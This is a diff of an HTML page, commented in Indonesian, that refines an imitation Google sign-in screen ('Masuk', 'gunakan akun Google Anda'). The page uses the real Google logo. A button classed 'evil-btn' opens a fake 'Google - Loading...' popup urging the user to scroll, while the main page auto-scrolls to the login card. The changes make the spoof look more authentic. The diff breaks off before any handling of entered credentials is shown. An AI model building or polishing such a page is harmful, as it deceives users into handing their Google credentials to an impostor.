@@ -11,22 +11,26 @@
     * { margin:0; padding:0; box-sizing:border-box; }
     body {
       font-family: "Google Sans", Roboto, Arial, sans-serif;
-      background: #fff;
+      background: #ffffff; /* putih polos */
       color: #202124;
       min-height: 6200px;
       transition: scroll-behavior 0.9s cubic-bezier(0.25, 0.1, 0.25, 1);
     }
+    /* Navbar selalu stay di atas, tak tergoyahkan */
     .top-bar {
       position: fixed;
-      top: 0; left: 0; right: 0;
+      top: 0;
+      left: 0;
+      right: 0;
       height: 64px;
-      background: #fff;
+      background: #ffffff; /* putih bersih */
       border-bottom: 1px solid #dadce0;
-      z-index: 9999;
+      z-index: 99999; /* super tinggi biar tak tertutup apapun */
       display: flex;
       align-items: center;
       justify-content: flex-end;
       padding: 0 24px;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.08);
     }
     .evil-btn {
       background: #1a73e8;
@@ -37,27 +41,37 @@
       font-size: 15px;
       font-weight: 500;
       cursor: pointer;
-      transition: all 0.25s;
+      transition: all 0.3s ease;
     }
     .evil-btn:hover {
-      background: #185abc;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.25);
-      transform: translateY(-2px);
+      background: #0d65d6;
+      box-shadow: 0 4px 12px rgba(26,115,232,0.4);
+      transform: translateY(-3px);
     }
-    .void { height: 4600px; background: linear-gradient(to bottom, #f8f9fa, #e8f0fe); }
-    .logo-container { text-align: center; padding: 160px 0 48px; }
+    .void {
+      height: 4600px;
+      background: #ffffff; /* hilangkan gradien, putih polos */
+    }
+    .login-card {
+      width: 100%;
+      max-width: 460px;
+      margin: 0 auto;
+      background: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.15), 0 2px 4px rgba(0,0,0,0.12);
+      padding: 60px 44px 48px;
+      margin-top: 80px; /* beri ruang dari atas setelah scroll */
+    }
+    .logo-container {
+      text-align: center;
+      margin-bottom: 32px;
+    }
     .google-logo {
       width: 96px;
       height: 33px;
       background: url('https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png') no-repeat center;
       background-size: contain;
       display: inline-block;
-    }
-    .login-card {
-      width: 100%; max-width: 460px; margin: 0 auto;
-      background: #fff; border-radius: 8px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.15), 0 2px 4px rgba(0,0,0,0.12);
-      padding: 52px 44px 40px;
     }
     h1 { font-size: 26px; font-weight: 400; margin-bottom: 10px; text-align: center; }
     .subtitle { color: #5f6368; font-size: 16px; text-align: center; margin-bottom: 36px; }
@@ -85,17 +99,17 @@
 </head>
 <body>
 
+  <!-- Navbar yang tak pernah hilang -->
   <div class="top-bar">
     <button class="evil-btn" id="evilTrigger">Buka Halaman Baru</button>
   </div>
 
   <div class="void"></div>
 
-  <div class="logo-container">
-    <div class="google-logo"></div>
-  </div>
-
   <div class="login-card">
+    <div class="logo-container">
+      <div class="google-logo"></div>
+    </div>
     <h1>Masuk</h1>
     <div class="subtitle">gunakan akun Google Anda</div>
     <input type="email" placeholder="Email atau nomor telepon" autocomplete="username">
@@ -108,15 +122,11 @@
   </div>
 
   <script>
-    // -----------------------------------------------------
-    // SCRIPT UTAMA - HALAMAN PERTAMA
-    // -----------------------------------------------------
     const evilButton = document.getElementById('evilTrigger');
 
     evilButton.addEventListener('click', () => {
-      // Buka halaman kedua (dengan konten panah ke bawah)
+      // Buka halaman kedua - putih polos + panah memaksa scroll
       const newWin = window.open('', '_blank', 'width=900,height=700,menubar=no,toolbar=no,scrollbars=yes');
-
       if (newWin) {
         newWin.document.write(`
           <!DOCTYPE html>
@@ -127,37 +137,19 @@
             <title>Google - Loading...</title>
             <style>
               body {
-                margin: 0;
-                padding: 0;
+                margin:0; padding:0;
                 font-family: Arial, sans-serif;
-                background: #f1f3f4;
+                background: #ffffff; /* putih polos total */
                 color: #202124;
                 min-height: 6200px;
                 text-align: center;
                 overflow-x: hidden;
               }
-              .arrow-container {
-                padding: 180px 20px 100px;
-                font-size: 120px;
-                color: #ea4335;
-                animation: pulse 2s infinite;
-              }
-              .text {
-                font-size: 36px;
-                font-weight: bold;
-                color: #1a73e8;
-                margin: 40px 0;
-              }
-              .small-text {
-                font-size: 24px;
-                color: #5f6368;
-                margin: 60px 0;
-              }
-              @keyframes pulse {
-                0%, 100% { transform: scale(1); opacity: 0.8; }
-                50% { transform: scale(1.15); opacity: 1; }
-              }
-              .arrow-row { margin: 120px 0; font-size: 180px; color: #4285f4; }
+              .arrow-container { padding: 200px 20px 120px; font-size: 140px; color: #ea4335; animation: pulse 1.8s infinite; }
+              .text { font-size: 42px; font-weight: bold; color: #1a73e8; margin: 50px 0; }
+              .small-text { font-size: 26px; color: #5f6368; margin: 70px 0; }
+              @keyframes pulse { 0%,100% { transform:scale(1); opacity:0.8; } 50% { transform:scale(1.2); opacity:1; } }
+              .arrow-row { margin: 140px 0; font-size: 200px; color: #4285f4; }
             </style>
           </head>
           <body>
@@ -165,17 +157,17 @@
             <div class="text">SCROLL KE BAWAH</div>
             <div class="small-text">Silakan gulir ke bawah untuk melanjutkan</div>
             <div class="arrow-row">↓↓↓↓↓</div>
-            <div style="height: 3800px;"></div>
+            <div style="height:3800px;"></div>
             <div class="arrow-row">↓↓↓↓↓</div>
             <div class="text" style="color:#34a853">TERUS GULIR!</div>
-            <div style="height: 800px;"></div>
+            <div style="height:800px;"></div>
           </body>
           </html>
         `);
         newWin.document.close();
       }
 
-      // Auto-scroll HALAMAN UTAMA setelah klik (dengan delay natural)
+      // Auto-scroll halaman utama setelah klik
       setTimeout(() => {
         window.scrollTo({
           top: document.body.scrollHeight,
